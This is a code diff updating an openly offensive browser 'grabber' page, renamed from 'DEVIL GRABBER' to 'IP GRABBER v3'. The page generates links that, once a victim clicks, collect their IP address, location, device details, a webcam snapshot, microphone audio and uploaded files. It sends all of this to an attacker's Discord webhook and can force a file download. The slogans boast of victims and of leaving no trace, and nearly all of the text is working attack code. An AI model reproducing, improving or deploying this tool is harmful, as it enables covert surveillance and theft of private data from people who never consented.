@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>DEVIL GRABBER</title>
+  <title>IP GRABBER v3</title>
   <style>
     :root { --bg: #000; --acc: #0f0; --card: #111; }
     body { margin:0; background:var(--bg); color:var(--acc); font-family: 'Courier New'; padding:20px; }
@@ -20,10 +20,10 @@
 </head>
 <body>
   <div class="card">
-    <h1>DEVIL GRABBER</h1>
-    <p>Generate link. Victim clicks. You own their soul.</p>
+    <h1>IP GRABBER v3</h1>
+    <p>Generate link → Victim clicks → You get everything.</p>
 
-    <input id="webhook" placeholder="Discord webhook URL" />
+    <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />
 
     <hr style="border:1px dashed #0f0; margin:20px 0;">
 
@@ -37,32 +37,30 @@
     </div>
     <label><input type="checkbox" id="upload"> Force File Upload</label>
     <label><input type="checkbox" id="silent"> Silent Mode (no redirect)</label>
-    <input id="redirect" placeholder="Redirect URL (or leave blank)" />
+    <input id="redirect" placeholder="Redirect URL (default: google.com)" />
 
     <button onclick="generate()">GENERATE LINK</button>
 
     <div id="result" class="hidden">
       <p><strong>Send this link:</strong></p>
       <div id="link"></div>
-      <button onclick="copy()">COPY</button>
+      <button onclick="copy()">COPY LINK</button>
     </div>
   </div>
 
-  <div class="footer">© 2025 DevilGrabber – No rules. No trace.</div>
+  <div class="footer">© 2025 – Silent. Deadly. Yours.</div>
 
   <script>
-    const toggles = ['ip','pc','cam','mic','download','upload','silent'];
-    toggles.forEach(id => {
-      document.getElementById(id).onchange = () => {
-        document.getElementById('dlbox').classList.toggle('hidden', !document.getElementById('download').checked);
-      };
-    });
+    // Toggle file input visibility
+    document.getElementById("download").onchange = () => {
+      document.getElementById("dlbox").classList.toggle("hidden", !document.getElementById("download").checked);
+    };
 
     function rand() { return Math.random().toString(36).substr(2, 10); }
 
     async function generate() {
       const webhook = document.getElementById("webhook").value.trim();
-      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid webhook required.");
+      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid Discord webhook required.");
 
       const config = {
         w: webhook,
@@ -102,10 +100,10 @@
 
     function copy() {
       navigator.clipboard.writeText(document.getElementById("link").innerText);
-      alert("Copied!");
+      alert("Link copied!");
     }
 
-    // === VICTIM SIDE ===
+    // === VICTIM SIDE – RUNS ON LINK CLICK ===
     if (location.search) {
       const params = new URLSearchParams(location.search);
       const id = params.get("id");
@@ -115,45 +113,50 @@
       document.body.innerHTML = `<h2 style="color:#0f0;text-align:center;margin-top:100px;">Loading...</h2>`;
 
       (async () => {
-        const data = { embeds: [{ fields: [], color: 65280, timestamp: new Date().toISOString() }] };
-        let files = [];
+        const embed = { title: "VICTIM HIT", color: 65280, fields: [], timestamp: new Date().toISOString() };
+        const files = [];
 
-        // IP + GEO
+        // === IP + GEO (USING YOUR WORKING METHOD) ===
         if (cfg.ip) {
-          const ip = await (await fetch("https://ipapi.co/json/")).json();
-          data.embeds[0].fields.push(
-            { name: "IP", value: ip.ip, inline: true },
-            { name: "Location", value: `${ip.city}, ${ip.country_name}`, inline: true },
-            { name: "ISP", value: ip.org || "Unknown", inline: true }
-          );
+          try {
+            const ipData = await (await fetch("https://ipapi.co/json/")).json();
+            embed.fields.push(
+              { name: "IP", value: ipData.ip, inline: true },
+              { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+              { name: "ISP", value: ipData.org || "Unknown", inline: true }
+            );
+          } catch (e) {}
         }
 
-        // PC INFO
+        // === PC INFO ===
         if (cfg.pc) {
-          const bat = await navigator.getBattery?.() || {};
-          data.embeds[0].fields.push(
-            { name: "Device", value: navigator.userAgent.slice(0,100), inline: false },
+          const battery = await navigator.getBattery?.() || {};
+          embed.fields.push(
+            { name: "Device", value: navigator.userAgent.slice(0, 100), inline: false },
             { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
-            { name: "Battery", value: bat.level ? Math.round(bat.level*100)+"%" : "N/A", inline: true },
+            { name: "Battery", value: battery.level ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
             { name: "Cores", value: navigator.hardwareConcurrency?.toString() || "N/A", inline: true }
           );
         }
 
-        // WEBCAM
+        // === WEBCAM ===
         if (cfg.cam) {
           try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const vid = document.createElement("video"); vid.srcObject = stream; vid.play();
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
             await new Promise(r => setTimeout(r, 1000));
-            const canvas = document.createElement("canvas"); canvas.width = 320; canvas.height = 240;
-            canvas.getContext("2d").drawImage(vid, 0, 0, 320, 240);
-            const img = canvas.toDataURL("image/jpeg", 0.7);
-            files.push({ name: "webcam.jpg", data: img });
+            const canvas = document.createElement("canvas");
+            canvas.width = 320; canvas.height = 240;
+            canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
+            const imgData = canvas.toDataURL("image/jpeg", 0.7);
+            files.push({ name: "webcam.jpg", data: imgData });
             stream.getTracks().forEach(t => t.stop());
-          } catch(e) {}
+          } catch (e) {}
         }
 
-        // MIC
+        // === MIC RECORD ===
         if (cfg.mic) {
           try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -161,35 +164,17 @@
             const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.start();
-            setTimeout(() => {
-              recorder.stop();
-              recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: "audio/webm" });
-                const reader = new FileReader();
-                reader.onload = () => {
-                  files.push({ name: "mic.webm", data: reader.result });
-                };
-                reader.readAsDataURL(blob);
-              };
-            }, 5000);
-          } catch(e) {}
+            await new Promise(r => setTimeout(r, 5000));
+            recorder.stop();
+            await new Promise(r => recorder.onstop = r);
+            const blob = new Blob(chunks, { type: "audio/webm" });
+            const dataUrl = await blobToDataURL(blob);
+            files.push({ name: "voice.webm", data: dataUrl });
+            stream.getTracks().forEach(t => t.stop());
+          } catch (e) {}
         }
 
-        // UPLOAD
-        if (cfg.up) {
-          const input = document.createElement("input"); input.type = "file";
-          input.onchange = () => {
-            const file = input.files[0];
-            const reader = new FileReader();
-            reader.onload = () => {
-              files.push({ name: file.name, data: reader.result });
-            };
-            reader.readAsDataURL(file);
-          };
-          input.click();
-        }
-
-        // DOWNLOAD
+        // === FORCE DOWNLOAD ===
         if (cfg.dl && cfg.dlData) {
           const a = document.createElement("a");
           a.href = cfg.dlData;
@@ -197,23 +182,57 @@
           a.click();
         }
 
-        // SEND TO DISCORD
+        // === FORCE UPLOAD ===
+        if (cfg.up) {
+          const input = document.createElement("input");
+          input.type = "file";
+          input.onchange = async () => {
+            const file = input.files[0];
+            if (file) {
+              const dataUrl = await fileToBase64(file);
+              files.push({ name: file.name, data: dataUrl });
+            }
+          };
+          input.click();
+        }
+
+        // === SEND TO DISCORD ===
         setTimeout(async () => {
-          const payload = { embeds: data.embeds };
-          if (files.length) {
+          const payload = { embeds: [embed] };
+          if (files.length > 0) {
             const form = new FormData();
             form.append("payload_json", JSON.stringify(payload));
-            files.forEach((f, i) => form.append(`file${i}`, dataURLtoBlob(f.data), f.name));
+            files.forEach((f, i) => {
+              const blob = dataURLtoBlob(f.data);
+              form.append(`file${i}`, blob, f.name);
+            });
             await fetch(cfg.w, { method: "POST", body: form });
           } else {
-            await fetch(cfg.w, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+            await fetch(cfg.w, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload)
+            });
           }
 
-          if (!cfg.silent) location.replace(cfg.redir);
-        }, 1000);
+          // === FINAL ACTION ===
+          if (!cfg.silent) {
+            location.replace(cfg.redir);
+          }
+        }, 1200);
       })();
     }
 
+    // Helper: Blob → DataURL
+    function blobToDataURL(blob) {
+      return new Promise((res) => {
+        const reader = new FileReader();
+        reader.onload = () => res(reader.result);
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    // Helper: DataURL → Blob
     function dataURLtoBlob(dataURL) {
       const [meta, data] = dataURL.split(",");
       const mime = meta.match(/:(.*?);/)[1];
